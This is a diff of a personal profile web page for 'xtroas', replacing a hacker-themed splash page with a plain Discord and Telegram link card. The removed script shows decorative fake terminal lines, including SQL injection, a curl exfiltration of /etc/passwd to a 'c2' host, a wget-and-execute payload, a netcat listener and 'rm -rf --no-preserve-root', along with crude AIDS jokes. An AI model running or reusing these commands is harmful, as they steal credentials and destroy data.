@@ -1,255 +1,374 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=0.85">
-    <title>Xtroas</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Orbitron:wght@900&family=Roboto+Mono&display=swap');
+<!-- saved from url=(0023)https://www.xtroas.xyz/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-        body {
-            margin: 0;
-            padding: 0;
-            background: #142b17;
-            color: rgb(255, 0, 0);
-            font-family: 'Roboto Mono', monospace;
-            overflow: hidden;
-            height: 100vh;
-            transform: scale(0.9);
-            transform-origin: center center;
-        }
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>@xtroas</title>
+<link rel="icon" href="https://www.xtroas.xyz/favicon.ico">
 
-        .container {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 90%;
-            max-width: 1200px;
-            text-align: center;
-        }
+<style>
+/* This website was made by @af5p on discord */
+*, *::before, *::after {
+  cursor: none !important;
+  box-sizing: border-box;
+}
 
-        .logo {
-            font-family: 'Creepster', cursive;
-            font-size: 9vw;
-            color: rgb(255, 0, 0);
-            text-shadow: 
-                0 0 10px rgb(255, 0, 0),
-                0 0 20px rgb(255, 0, 0),
-                0 0 40px rgb(255, 0, 0),
-                0 0 80px rgb(136, 0, 0);
-            letter-spacing: 0.8rem;
-            white-space: nowrap;
-            overflow: hidden;
-            margin: 0 auto 2rem auto;
-            height: 1.2em;
-        }
+body {
+  margin: 0;
+  height: 100vh;
+  width: 100vw;
+  font-family: 'Poppins', sans-serif;
+  color: #fff;
+  overflow: hidden;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: #000;
+}
 
-        .logo::after {
-            content: '|';
-            animation: blink 0.8s infinite;
-            color: rgb(255, 0, 0);
-        }
+/* VIDEO BACKGROUND */
+#bgVideo {
+  position: fixed;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: -2;
+}
 
-        @keyframes glow {
-            0% { text-shadow: 0 0 10px rgb(255, 0, 0), 0 0 20px rgb(255, 0, 0), 0 0 40px rgb(255, 0, 0); }
-            100% { text-shadow: 0 0 20px rgb(255, 0, 0), 0 0 40px rgb(255, 0, 0), 0 0 80px rgb(136, 0, 0), 0 0 120px rgb(68, 0, 0); }
-        }
+.overlay {
+  position: absolute;
+  inset: 0;
+  background: rgba(0,0,0,0.4);
+  backdrop-filter: blur(3px);
+}
 
-        @keyframes blink {
-            50% { opacity: 0; }
-        }
+.app {
+  position: relative;
+  height: 100vh;
+  width: 100vw;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  perspective: 1000px;
+}
 
-        .skull {
-            font-size: 12vw;
-            color: rgb(136, 0, 0);
-            filter: drop-shadow(0 0 30px rgb(255, 0, 0));
-            margin-bottom: 1rem;
-        }
+.blurred {
+  filter: blur(14px);
+  pointer-events: none;
+  user-select: none;
+}
 
-        .message {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 2.8vw;
-            color: rgb(255, 0, 0);
-            text-shadow: 0 0 15px rgb(255, 0, 0);
-            margin-bottom: 3rem;
-            animation: pulse 2s infinite;
-        }
+.gate {
+  position: fixed;
+  inset: 0;
+  display: grid;
+  place-items: center;
+  background: rgba(0,0,0,0.55);
+  backdrop-filter: blur(6px);
+  z-index: 50;
+}
 
-        @keyframes pulse {
-            0% { opacity: 0.7; }
-            50% { opacity: 1; }
-            100% { opacity: 0.7; }
-        }
+.gate.hide {
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity .35s ease, visibility .35s step-end;
+}
 
-        .terminal {
-            background: rgba(0, 20, 0, 0.9);
-            border: 2px solid rgb(255, 0, 0);
-            padding: 2rem;
-            box-shadow: 0 0 40px #080;
-            font-size: 1.6rem;
-            color: #0f0;
-            text-align: left;
-            margin: 0 auto;
-            width: 90%;
-            max-width: 1000px;
-        }
+.gate-inner {
+  padding: 28px 36px;
+  border-radius: 18px;
+  background: rgba(255,255,255,0.06);
+  border: 1px solid rgba(255,255,255,0.15);
+  box-shadow: 0 20px 80px rgba(0,0,0,0.4);
+  text-align: center;
+}
 
-        .terminal-line {
-            white-space: nowrap;
-            overflow: hidden;
-            margin: 0.8rem 0;
-        }
+.gate-title {
+  font-size: clamp(22px, 4vw, 32px);
+  font-weight: 800;
+}
 
-        .matrix-rain {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            overflow: hidden;
-            z-index: -1;
-        }
+.card {
+  position: relative;
+  z-index: 2;
+  text-align: center;
 
-        .drop {
-            position: absolute;
-            color: #0f0;
-            font-size: 1.2rem;
-            white-space: nowrap;
-            animation: fall linear infinite;
-            opacity: 0.7;
-        }
+  /* Softer glass */
+  background: rgba(255, 255, 255, 0.04);
+  backdrop-filter: blur(6px);
 
-        @keyframes fall {
-            0% { transform: translateY(-100px); opacity: 0; }
-            10% { opacity: 0.7; }
-            90% { opacity: 0.7; }
-            100% { transform: translateY(100vh); opacity: 0; }
-        }
+  border-radius: 20px;
+  padding: 30px 40px;
+  width: 90%;
+  max-width: 500px;
 
-        .scanlines {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(0, 0, 0, 0.15),
-                rgba(0, 0, 0, 0.15) 1px,
-                transparent 1px,
-                transparent 2px
-            );
-            pointer-events: none;
-            animation: scan 12s linear infinite;
-            z-index: 1;
-        }
+  border: 1px solid rgba(255,255,255,0.08); /* subtle edge */
+  box-shadow: 0 10px 40px rgba(0,0,0,0.25); /* softer shadow */
 
-        @keyframes scan {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(100vh); }
-        }
-    </style>
+  transform-style: preserve-3d;
+  transition: transform 0.15s ease-out;
+}
+
+.profile-link {
+  text-decoration: none;
+  color: inherit;
+  display: inline-flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.profile-pic {
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  object-fit: cover;
+  border: 3px solid rgba(255,255,255,0.3);
+  margin-bottom: 10px;
+}
+
+h1 {
+  font-size: 1.8em;
+  margin: 5px 0;
+  font-weight: 700;
+}
+
+.discord-username {
+  color: #ccc;
+  font-size: 0.95em;
+  margin-bottom: 10px;
+}
+
+.socials {
+  display: flex;
+  justify-content: center;
+  gap: 12px;
+  margin-top: 15px;
+}
+
+.socials img {
+  width: 45px;
+  height: 45px;
+  transition: 0.2s;
+}
+
+.socials img:hover {
+  filter: brightness(1.2);
+}
+
+/* Custom Cursor */
+.custom-cursor {
+  position: fixed;
+  width: 24px;
+  height: 24px;
+  background: url('cursor.png') center / contain no-repeat;
+  pointer-events: none;
+  transform: translate(-50%, -50%);
+  z-index: 9999;
+  transition: transform 0.08s ease-out, opacity 0.2s;
+}
+
+.custom-cursor.hover {
+  transform: translate(-50%, -50%) scale(1.3);
+  opacity: 0.8;
+}
+
+/* ===== Music bar (bottom) ===== */
+.music-bar {
+  position: fixed;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  padding: 10px 16px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 12px;
+  background: rgba(0, 0, 0, 0.65);
+  border-top: 1px solid rgba(255,255,255,0.12);
+  backdrop-filter: blur(8px);
+  z-index: 20;
+
+  /* hidden until click-to-enter */
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity .35s ease;
+}
+
+.music-bar.active {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.music-button {
+  border: 1px solid rgba(255,255,255,0.35);
+  background: rgba(255,255,255,0.10);
+  color: #fff;
+  padding: 8px 18px;
+  border-radius: 999px;
+  font-size: 13px;
+  font-weight: 500;
+  cursor: pointer;
+  letter-spacing: .2px;
+  transition: background .15s ease, transform .12s ease, border-color .12s ease;
+  white-space: nowrap;
+}
+
+.music-button:hover {
+  background: rgba(255,255,255,0.16);
+  border-color: rgba(255,255,255,0.6);
+  transform: translateY(-1px);
+}
+
+.slider-container {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  max-width: 0;
+  opacity: 0;
+  overflow: hidden;
+  pointer-events: none;
+  transition: max-width .25s ease, opacity .25s ease;
+}
+
+.slider-container.visible {
+  max-width: 220px;
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.volume-label {
+  font-size: 11px;
+  color: #d1d5db;
+  white-space: nowrap;
+}
+
+#volume-slider {
+  width: 140px;
+  cursor: pointer;
+}
+</style>
 </head>
+
 <body>
-    <div class="scanlines"></div>
-    <div class="matrix-rain" id="rain"></div>
 
-    <div class="container">
-        <div class="skull">☠</div>
-        <div class="logo" id="logo"></div>
-        
-        <div class="message">
-            |- @xtroas on discord -|
-        </div>
+<!-- VIDEO -->
+<video id="bgVideo" muted="" loop="" playsinline="">
+  <source src="background.mp4" type="video/mp4">
+</video>
 
-        <div class="terminal" id="terminal">
-            <!-- Lines injected by JS -->
-        </div>
+<div id="gate" class="gate hide">
+  <div class="gate-inner">
+    <div class="gate-title">Click to enter</div>
+  </div>
+</div>
+
+<div id="app" class="app">
+  <div class="overlay"></div>
+
+  <div class="card" id="card" style="transform: rotateY(-0.023511deg) rotateX(0.459184deg);">
+    <a class="profile-link" href="https://discord.com/users/1239153644625199155" target="_blank">
+      <img class="profile-pic" id="discordAvatar" src="./index_files/2e3cf6609d2e3b20554ba5c401c9dc48.webp" alt="Profile">
+      <h1>xtroas</h1>
+    </a>
+
+    <div class="discord-username" id="discordName">@acivila</div>
+    <div class="discord-username" id="discordStatus">If you need to contact me, text me on discord/telegram.</div>
+
+    <div class="socials">
+      <a href="https://t.me/xtroas" target="_blank">
+        <img src="./index_files/telegram.png" alt="Telegram">
+      </a>
     </div>
+  </div>
+</div>
 
-    <script>
-        // Matrix rain
-        const rainContainer = document.getElementById('rain');
-        const chars = '01010100101AIDS101001001001010BALLS1001010010001XTROAS';
-        setInterval(() => {
-            const drop = document.createElement('div');
-            drop.classList.add('drop');
-            drop.textContent = Array(Math.floor(Math.random() * 20 + 10))
-                .fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
-            drop.style.left = Math.random() * 100 + '%';
-            drop.style.animationDuration = (Math.random() * 6 + 6) + 's';
-            drop.style.fontSize = (Math.random() * 0.5 + 0.8) + 'rem';
-            rainContainer.appendChild(drop);
-            setTimeout(() => drop.remove(), 20000);
-        }, 150);
+<!-- Audio element for background music -->
+<audio id="bg-music" src="music.mp3" preload="auto" loop=""></audio>
 
-        // Infinite looping typewriter for title
-        const logo = document.getElementById('logo');
-        const titleText = 'XTROAS.XYZ';
-        let i = 0;
-        let direction = 1; // 1 = typing, -1 = deleting
+<!-- Bottom music bar -->
+<div class="music-bar active" id="musicBar" aria-label="Background music controls">
+  <button id="music-toggle" class="music-button">
+    Pause music
+  </button>
 
-        function typeLoop() {
-            if (direction === 1) {
-                // Typing forward
-                if (i < titleText.length) {
-                    logo.textContent = titleText.substring(0, i + 1);
-                    i++;
-                } else {
-                    setTimeout(() => { direction = -1; typeLoop(); }, 2000); // Pause at end
-                    return;
-                }
-            } else {
-                // Deleting backward
-                if (i > 0) {
-                    logo.textContent = titleText.substring(0, i);
-                    i--;
-                } else {
-                    direction = 1;
-                }
-            }
-            setTimeout(typeLoop, 150);
-        }
+  <div id="volume-wrap" class="slider-container visible" aria-hidden="false">
+    <span class="volume-label">Volume</span>
+    <input type="range" id="volume-slider" min="0" max="1" step="0.01" value="0.3" aria-label="Music volume">
+  </div>
+</div>
 
-        setTimeout(typeLoop, 500);
+<div class="custom-cursor hover" id="cursor" style="left: 1272px; top: 598px;"></div>
 
-        // Fake advanced command sets (SQL, network, system breaches)
-        const commandSets = [
-            ["SELECT * FROM users WHERE 1=1; --", "DUMPING user_credentials...", "INSERT INTO backdoors (payload) VALUES ('dumbass');", "TRUNCATE TABLE sessions;", "GRANT ALL PRIVILEGES ON *.* TO 'xtroas'@'%';"],
-            ["nmap -sS -p- -T4 192.168.0.0/16", "Scanning internal network...", "arp -a | grep spoof", "nc -lvp 4444 &", "ssh -o StrictHostKeyChecking=no root@*"],
-            ["DROP DATABASE production;", "Exfiltrating credit_cards table...", "UPDATE payments SET amount=0 WHERE user_id>0;", "ALTER TABLE admins ADD COLUMN owned TINYINT DEFAULT 1;", "REVOKE ALL PRIVILEGES FROM legitimate_users_whith_aids;"],
-            ["iptables -I INPUT -s 0.0.0.0/0 -j ACCEPT", "Opening reverse shell on 1337...", "curl -X POST http://c2.xtroas.xyz/exfil --data-binary @/etc/passwd", "wget http://xtroas.xyz/aids -O /tmp/.x", "chmod +x /tmp/.x && /tmp/.x &"],
-            ["SHOW TABLES FROM wordpress;", "Dumping wp_users hashed passwords...", "INSERT INTO wp_posts (post_title) VALUES ('XTROAS WAS HERE');", "DELETE FROM balls WHERE status='rooted';", "FLUSH PRIVILEGES && DEEZNUTS;"],
-            ["traceroute -m 30 xtroas.xyz", "Routing through TOR nodes...", "hping3 --flood -S target_ip", "ethtool -K eth0 tx off rx off", "sudo rm -rf/ --no-preserve-root"],
-            ["UNION SELECT username,password FROM dumbass.user;", "Escalating to DBA...", "CREATE PROCEDURE rootkit() BEGIN FROUNTDOOR;", "CALL bigaids();", "DROP PROCEDURE IF EXISTS security;"]
-        ];
+<script>
+const gate = document.getElementById('gate');
+const app = document.getElementById('app');
+const card = document.getElementById('card');
+const cursor = document.getElementById('cursor');
+const bgVideo = document.getElementById('bgVideo');
 
-        // Random set on each load
-        const randomSet = commandSets[Math.floor(Math.random() * commandSets.length)];
-        const terminal = document.getElementById('terminal');
+/* Music bar elements */
+const musicBar = document.getElementById('musicBar');
+const music = document.getElementById('bg-music');
+const musicToggle = document.getElementById('music-toggle');
+const volumeWrap = document.getElementById('volume-wrap');
+const volumeSlider = document.getElementById('volume-slider');
 
-        randomSet.forEach((cmd, index) => {
-            const line = document.createElement('div');
-            line.className = 'terminal-line';
-            line.textContent = cmd;
-            line.style.width = '0';
-            line.style.animation = `typing ${cmd.length * 0.08 + 1}s steps(${cmd.length}) ${index * 4 + 2}s forwards`;
-            terminal.appendChild(line);
-        });
+/* Initial volume */
+music.volume = parseFloat(volumeSlider.value);
 
-        // Add blinking cursor to last line only during typing
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes typing { from { width: 0; } to { width: 100%; } }
-            .terminal-line:last-child { 
-                border-right: 0.15em solid #0f0; 
-                animation: typing ${randomSet[randomSet.length-1].length * 0.08 + 1}s steps(${randomSet[randomSet.length-1].length}) ${randomSet.length * 4}s forwards,
-                           blink 0.8s ${randomSet.length * 4 + 2}s infinite;
-            }
-        `;
-        document.head.appendChild(style);
-    </script>
-</body>
-</html>
+gate.addEventListener('click', () => {
+  gate.classList.add('hide');
+  app.classList.remove('blurred');
+
+  // show bar + start audio/video (allowed after user gesture)
+  musicBar.classList.add('active');
+  music.play().catch(() => {});
+  bgVideo.play().catch(() => {});
+});
+
+musicToggle.addEventListener('click', () => {
+  if (music.paused) {
+    music.play().catch(() => {});
+    musicToggle.textContent = 'Pause music';
+    volumeWrap.classList.add('visible');
+    volumeWrap.setAttribute('aria-hidden', 'false');
+  } else {
+    music.pause();
+    musicToggle.textContent = 'Play music';
+  }
+});
+
+volumeSlider.addEventListener('input', (e) => {
+  music.volume = parseFloat(e.target.value);
+});
+
+document.addEventListener('mousemove', e => {
+  const x = (e.clientX / window.innerWidth - 0.5) * 15;
+  const y = (e.clientY / window.innerHeight - 0.5) * -15;
+
+  card.style.transform = `rotateY(${x}deg) rotateX(${y}deg)`;
+
+  cursor.style.left = e.clientX + 'px';
+  cursor.style.top = e.clientY + 'px';
+});
+
+document.querySelectorAll('a, button, input').forEach(el => {
+  el.addEventListener('mouseenter', () => cursor.classList.add('hover'));
+  el.addEventListener('mouseleave', () => cursor.classList.remove('hover'));
+});
+
+/* ===== STATIC "DISCORD" INFO (NO API) ===== */
+document.getElementById('discordName').textContent = '@acivila';
+
+document.getElementById('discordAvatar').src =
+  'https://cdn.discordapp.com/avatars/1239153644625199155/2e3cf6609d2e3b20554ba5c401c9dc48.webp?size=1024';
+
+/* Bio stays normal (static text) */
+document.getElementById('discordStatus').innerHTML =
+  'If you need to contact me, text me on discord/telegram.';
+</script>
+
+
+
+</body></html>
